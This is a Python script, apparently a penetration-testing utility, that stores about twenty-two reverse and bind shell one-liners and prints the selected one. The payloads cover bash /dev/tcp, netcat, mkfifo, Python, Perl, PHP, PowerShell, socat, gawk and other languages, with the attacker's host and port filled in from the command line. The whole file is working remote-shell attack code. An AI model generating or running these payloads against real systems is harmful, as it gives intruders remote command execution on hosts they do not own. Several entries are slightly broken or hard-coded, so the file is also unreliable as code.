#!/usr/bin/env python3
"""
Shell Generator
"""
import argparse,sys
# {'name':'','type':'','cmd':''},
shells= [{'name':'reverse_powershell','type':'reverse','cmd':'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'LHOST\',LPORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"'},
         {'name':'reverse_bash','type':'reverse','cmd':'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'},
         {'name':'reverse_perl','type':'reverse','cmd':'perl -e \'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''},
         {'name':'reverse_python','type':'reverse','cmd':'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);\''},
         {'name':'reverse_php','type':'reverse','cmd':'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\''},
         {'name':'reverse_ruby','type':'reverse','cmd':'ruby -rsocket -e\'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''},
         {'name':'reverse_netcat','type':'reverse','cmd':'nc -e /bin/sh LHOST LPORT'},
         {'name':'reverse_mkfifo','type':'reverse','cmd':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f'},
         {'name':'reverse_java','type':'reverse','cmd':'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/LHOST/LPORT;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);p.waitFor()'},
         {'name':'reverse_bash_2','type':'reverse','cmd':'0<&196;exec 196<>/dev/tcp/LHOST/LPORT; sh <&196 >&196 2>&196'},
         {'name':'reverse_mknod_telnet','type':'reverse','cmd':'rm -f /tmp/p; mknod /tmp/p p && telnet LHOST LPORT 0/tmp/p'},
         {'name':'reverse_telnet','type':'reverse','cmd':'telnet LHOST 4444 | /bin/bash | telnet LHOST 4445'},
         {'name':'bind_powershell','type':'bind','cmd':'powershell -c "$listener = New-Object System.Net.Sockets.TcpListener(\'0.0.0.0\',RPORT);$listener.start();$client =$listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"'},
         {'name':'reverse_powercat','type':'reverse','cmd':'powercat -c LHOST -p LPORT -e cmd.exe'},
         {'name':'bind_powercat','type':'bind','cmd':'powercat -l 0.0.0.0 -p RPORT -e cmd.exe'},
         {'name':'reverse_socat','type':'reverse','cmd':'socat tcp:LHOST:LPORT exec:\'bash -i\' ,pty,stderr,setsid,sigint,sane &'},
         {'name':'reverse_go','type':'reverse','cmd':'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","127.0.0.1:1337");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;http://cmd.Run();}\'>/tmp/sh.go&&go run /tmp/sh.go'},
         {'name':'reverse_php_bash','type':'reverse','cmd':'<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/"ATTACKING IP"/443 0>&1\'");?>'},
         {'name':'reverse_netcat_sh','type':'reverse','cmd':'/bin/sh | nc LHOST LPORT'},
         {'name':'reverse_nodejs','type':'reverse','cmd':'require(\'child_process\').exec(\'bash -i >& /dev/tcp/10.0.0.1/80 0>&1\');'},
         {'name':'reverse_perl_win','type':'reverse','cmd':'perl -MIO -e \'$c=new IO::Socket::INET(PeerAddr,"LHOST:LPORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\''},
         {'name':'reverse_gawk','type':'reverse','cmd':'gawk \'BEGIN {P=LPORT;S="> ";H="LHOST";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}\''},
         ]

parser = argparse.ArgumentParser()
args = ""
def parse_parameters():
    global args,parser
    parser.add_argument('-s','--shell',help='The name of the given SHELL')
    parser.add_argument('-t','--type',help='The type [bind/reverse]')
    parser.add_argument('-r','--reverse',action='store_true',help='reverse shell')
    parser.add_argument('-b','--bind',action='store_true',help='bind shell')    
    parser.add_argument('--rhost',help='The remote host address')
    parser.add_argument('--rport',help='The remote host port')
    parser.add_argument('--lhost',help='The local listening address')
    parser.add_argument('--lport',help='The local listening port')
    parser.add_argument('--list',action='store_true',help='List all available shells')
            
    args = parser.parse_args()
    
    
    
def list_available_shells(t=''):
    i=0
    print("Available Shells")
    print("-----------------\n")
    if t == '':
        for s in shells:
            print("{num}. {shell}".format(num=i,shell=s['name']))
            i+=1
    elif t == 'r':
        for s in shells:
            if s['type'] == 'reverse':
                print("{num}. {shell}".format(num=i,shell=s['name']))
                i+=1        
    elif t == 'b':
        for s in shells:
            if s['type'] == 'bind':
                print("{num}. {shell}".format(num=i,shell=s['name']))
                i+=1  
            
def get_shell_by_name(name):
    for s in shells:
        if s['name'].lower() == name.lower():
            return s
        
def main():
    parse_parameters()
    rhost = "0.0.0.0"
    lhost = "10.10.10.10"
    rport = 8001
    lport = 9001
    shell_type = ""
    shell_name = ""
    
    if args.list:
        list_available_shells()
        sys.exit(0)
        
    if args.rhost: rhost = args.rhost; shell_type = 'reverse'
    if args.rport: 
        try: 
            rport = int(args.rport) 
        except: 
            print("[!] Invalid port number")
        shell_type = 'reverse'
    if args.lhost: lhost = args.lhost;shell_type = 'bind'
    if args.lport:
        try:
            lport = int(args.lport)
        except:
            print("[!] Invalid port number")
            shell_type = 'bind'
    if args.type:
        if args.type.lower() == 'bind':shell_type = 'bind'
        if args.type.lower() == 'reverse':shell_type = 'reverse'
    if args.reverse: shell_type = 'reverse'
    if args.bind: shell_type = 'bind'
    if args.shell: shell_name = args.shell
    
    
    # Generating shell
    if shell_name:
        s = get_shell_by_name(shell_name)
        if s['type']=='bind':
            s['cmd'] = s['cmd'].replace('RHOST',rhost).replace('RPORT',str(rport))
            print("{NAME}/{TYPE}/{RHOST}/{RPORT}\n".format(NAME=s['name'],TYPE=s['type'],RHOST=rhost,RPORT=str(rport)))
        
        else:
            s['cmd'] = s['cmd'].replace('LHOST',lhost).replace('LPORT',str(lport))
            print("{NAME}/{TYPE}/{LHOST}/{LPORT}\n".format(NAME=s['name'],TYPE=s['type'],LHOST=lhost,LPORT=str(lport)))
            
        print(s['cmd'])
    else:
        if lhost and lport and shell_type == 'reverse':
            list_available_shells('r')
        elif rhost and rport and shell_type == 'bind':
            list_available_shells('b')
    
    

if __name__ == '__main__':
    main()